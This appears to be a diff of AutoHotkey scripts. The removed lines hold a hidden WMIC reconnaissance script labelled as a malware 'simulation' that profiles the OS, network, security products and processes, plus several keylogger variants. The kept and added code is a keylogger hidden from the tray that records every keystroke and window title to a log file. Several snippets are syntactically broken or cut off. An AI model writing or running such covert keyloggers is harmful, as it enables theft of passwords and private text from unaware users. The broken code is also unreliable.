@@ -1,287 +1,3 @@
-hu
-#NoEnv
-#SingleInstance Force
-#Persistent
-
-LogFile := "simulation_log.txt"
-
-; Function to execute WMIC commands and append results to log
-RunWmicCommand(cmd) {
-    RunWait, %comspec% /c wmic %cmd% >> %LogFile% 2>&1, , Hide
-    FileAppend, `n--- %cmd% executed at %A_Now% ---`n, %LogFile%
-}
-
-; Collect Operating System information
-RunWmicCommand("os get Caption, Version, BuildNumber, InstallDate")
-
-; Collect Logical Disk information
-RunWmicCommand("logicaldisk get DeviceID, FileSystem, FreeSpace")
-
-; Collect Processor information
-RunWmicCommand("cpu get Name, MaxClockSpeed, NumberOfCores, Architecture")
-
-; Collect Video Controller information
-RunWmicCommand("path Win32_VideoController get Name, AdapterRAM, DriverVersion")
-
-; Collect Network Adapter Configuration
-RunWmicCommand("nicconfig where IPEnabled=true get IPAddress, DefaultIPGateway, DNSServerSearchOrder")
-
-; Collect Firewall Product information
-RunWmicCommand("product where \"Name like '%firewall%'\" get Name, Version, Status")
-
-; Collect AntiSpyware Product information
-RunWmicCommand("product where \"Name like '%antispyware%'\" get Name, Version, Status")
-
-; Collect Process information with executable path
-RunWmicCommand("process where \"ExecutablePath is not null\" get Name, ExecutablePath, ProcessID")
-
-; Simulate C2 transmission by logging completion
-FileAppend, WMI queries completed and data logged at %A_Now%`n, %LogFile%
-
-TrayTip, HotWire Simulation, WMI queries executed. Check %LogFile%.
-
-; Keep script running
-Return
-
-
-
-#Requires AutoHotkey v2.0
-#SingleInstance Force
-Persistent
-
-LogFile := "simulation_log.txt"
-
-; Function to execute WMIC commands and append results to log
-RunWmicCommand(cmd) {
-    RunWait 'cmd.exe /c wmic ' cmd ' >> "' LogFile '" 2>&1', , Hide
-    FileAppend "`n--- " cmd " executed at " A_Now " ---`n", LogFile
-}
-
-; Collect Operating System information
-RunWmicCommand("os get Caption, Version, BuildNumber, InstallDate")
-
-; Collect Logical Disk information
-RunWmicCommand("logicaldisk get DeviceID, FileSystem, FreeSpace")
-
-; Collect Processor information
-RunWmicCommand("cpu get Name, MaxClockSpeed, NumberOfCores, Architecture")
-
-; Collect Video Controller information
-RunWmicCommand("path Win32_VideoController get Name, AdapterRAM, DriverVersion")
-
-; Collect Network Adapter Configuration
-RunWmicCommand("nicconfig where IPEnabled=true get IPAddress, DefaultIPGateway, DNSServerSearchOrder")
-
-; Collect Firewall Product information
-RunWmicCommand("product where ""Name like '%firewall%'"" get Name, Version, Status")
-
-; Collect AntiSpyware Product information
-RunWmicCommand("product where ""Name like '%antispyware%'"" get Name, Version, Status")
-
-; Collect Process information with executable path
-RunWmicCommand("process where ""ExecutablePath is not null"" get Name, ExecutablePath, ProcessID")
-
-; Simulate C2 transmission by logging completion
-FileAppend "WMI queries completed and data logged at " A_Now "`n", LogFile
-
-TrayTip "HotWire Simulation", "WMI queries executed. Check " LogFile "."
-
-; Keep script running
-Return
-
-
-
-#Requires AutoHotkey v2.0
-#SingleInstance Force
-Persistent
-
-LogFile := "simulation_log.txt"
-
-; Function to execute WMIC commands and append results to log
-RunWmicCommand(cmd) {
-    RunWait 'cmd.exe /c wmic ' cmd ' >> "' LogFile '" 2>&1', , Hide
-    FileAppend "`n--- " cmd " executed at " A_Now " ---`n", LogFile
-}
-
-; Collect Operating System information
-RunWmicCommand("os get Caption, Version, BuildNumber, InstallDate")
-
-; Collect Logical Disk information
-RunWmicCommand("logicaldisk get DeviceID, FileSystem, FreeSpace")
-
-; Collect Processor information
-RunWmicCommand("cpu get Name, MaxClockSpeed, NumberOfCores, Architecture")
-
-; Collect Video Controller information
-RunWmicCommand("path Win32_VideoController get Name, AdapterRAM, DriverVersion")
-
-; Collect Network Adapter Configuration
-RunWmicCommand("nicconfig where IPEnabled=true get IPAddress, DefaultIPGateway, DNSServerSearchOrder")
-
-; Collect Firewall Product information (corrected quote handling)
-RunWmicCommand('product where "Name like ''%firewall%''" get Name, Version, Status')
-
-; Collect AntiSpyware Product information (corrected quote handling)
-RunWmicCommand('product where "Name like ''%antispyware%''" get Name, Version, Status')
-
-; Collect Process information with executable path (corrected quote handling)
-RunWmicCommand('process where "ExecutablePath is not null" get Name, ExecutablePath, ProcessID')
-
-; Simulate C2 transmission by logging completion
-FileAppend "WMI queries completed and data logged at " A_Now "`n", LogFile
-
-TrayTip "HotWire Simulation", "WMI queries executed. Check " LogFile "."
-
-; Keep script running
-Return
-
-
-
-#Requires AutoHotkey v2.0
-#SingleInstance Force
-Persistent
-#NoTrayIcon
-
-PastWin := 0
-
-Loop
-{
-    Win := WinGetTitle("A")
-    Key := Input("V T5")
-    if (Win = PastWin)
-        FileAppend Key, "Log.txt"
-    else
-        FileAppend Win "[" Key "]", "Log.txt"
-    PastWin := Win
-}
-
-
-
-#Requires AutoHotkey v2.0
-#SingleInstance Force
-Persistent
-#NoTrayIcon
-
-PastWin := ""
-
-; Capture any key press
-~*$*a::
-~*$*b::
-~*$*c::
-; Add more keys as needed (e.g., ~*$*1, ~*$*Space, etc.)
-{
-    Win := WinGetTitle("A")
-    Key := A_ThisHotkey  ; Get the pressed key
-    Key := StrReplace(Key, "~*$*", "")  ; Clean the hotkey prefix
-    if (Win = PastWin)
-        FileAppend Key, "Log.txt"
-    else
-        FileAppend Win "[" Key "]", "Log.txt"
-    PastWin := Win
-}
-return
-
-
-
-
-#Requires AutoHotkey v2.0
-#SingleInstance Force
-#InstallKeybdHook
-
-; Configuration
-global LogFile := A_ScriptDir "\keylog.txt"  ; Log file path
-global LoggingEnabled := true               ; Start logging immediately
-global Modifiers := Map(                    ; Modifier key symbols
-    "Ctrl", "^",
-    "Alt", "!",
-    "Shift", "+",
-    "LWin", "#",
-    "RWin", "#"
-)
-
-; Set up modifier key hotkeys
-For mod in Modifiers
-    Hotkey "~*" mod, LogKey
-
-; Wildcard hotkey for other keys
-Hotkey "~*", WildcardKey
-
-; Toggle logging with F12
-Hotkey "$F12", (*) => ToggleLogging()
-
-; Exit script with F10
-Hotkey "$F10", (*) => ExitApp()
-
-; Main functions
-WildcardKey(*) {
-    if LoggingEnabled && !IsModifierKey(A_ThisHotkey)
-        LogKey(A_ThisHotkey)
-}
-
-LogKey(KeyName) {
-    try {
-        winTitle := WinGetTitle("A")
-        currentTime := FormatTime(, "yyyy-MM-dd HH:mm:ss")
-        entry := "[" currentTime "] [" winTitle "] " GetKeyString(KeyName) "`n"
-        FileAppend entry, LogFile
-    }
-}
-
-GetKeyString(KeyName) {
-    if Modifiers.Has(KeyName)
-        return KeyName
-    
-    prefix := ""
-    For mod, symbol in Modifiers
-        if GetKeyState(mod)
-            prefix .= symbol
-    
-    return prefix . KeyName
-}
-
-IsModifierKey(KeyName) {
-    return Modifiers.Has(KeyName) || KeyName = "F12"
-}
-
-ToggleLogging() {
-    global LoggingEnabled := !LoggingEnabled
-    status := LoggingEnabled ? "ENABLED" : "DISABLED"
-    TrayTip "Keylogger", "Logging " status, 1
-    SetTimer () => TrayTip(), -2000  ; Hide after 2 seconds
-}
-
-; Initial notification
-TrayTip "Keylogger Active", "Press F12 to toggle logging`n
-
-
-
-#Requires AutoHotkey v2.0
-#SingleInstance Force
-Persistent
-#NoTrayIcon
-
-PastWin := ""
-
-Loop
-{
-    Win := WinGetTitle("A")
-    Key := Input("L1 T5")  ; Capture a single key with 5-second timeout
-    if (Key)
-    {
-        if (Win = PastWin)
-            FileAppend Key, "Log.txt"
-        else
-            FileAppend Win "[" Key "]", "Log.txt"
-        PastWin := Win
-    }
-    Sleep 100  ; Prevent high CPU usage
-}
-
-
-
-
-
-
 #Requires AutoHotkey v2.0
 #SingleInstance Force
 #NoTrayIcon
@@ -289,45 +5,31 @@ Loop
 LogFile := A_ScriptDir "\Log.txt"
 LastWin := ""
 
+; Create log file if it doesn't exist
+if !FileExist(LogFile)
+    FileAppend "", LogFile
+
 Loop {
     ; Get active window title
     try CurrentWin := WinGetTitle("A")
-    catch  ; If no active window
+    catch
         CurrentWin := "N/A"
     
-    ; Wait for key input
-    Key := Input("V T1", , "L1 I")
+    ; Capture single key press
+    IH := InputHook("L1 V")
+    IH.Start()
+    IH.Wait()
+    Key := IH.Input
+    
+    ; Skip empty keys (like modifier-only presses)
+    if Key = ""
+        continue
     
     ; Log based on window change
     if (CurrentWin == LastWin) {
         FileAppend Key, LogFile
     } else {
-        FileAppend (LastWin ? "`n" : "") CurrentWin "|" Key "|", LogFile
-        LastWin := CurrentWin
-    }
-}
-
-
-
-#Requires AutoHotkey v2.0
-#SingleInstance Force
-#NoTrayIcon
-
-LogFile := A_ScriptDir "\FullLog.txt"
-LastWin := ""
-
-~*:: {
-    global LastWin
-    try CurrentWin := WinGetTitle("A")
-    catch
-        CurrentWin := "N/A"
-    
-    Key := SubStr(A_ThisHotkey, 3)  ; Remove ~* prefix
-    
-    if (CurrentWin == LastWin) {
-        FileAppend "|" Key, LogFile
-    } else {
-        FileAppend (LastWin ? "`n" : "") CurrentWin "|" Key "|", LogFile
+        FileAppend "`n" CurrentWin "|" Key "|", LogFile
         LastWin := CurrentWin
     }
 }
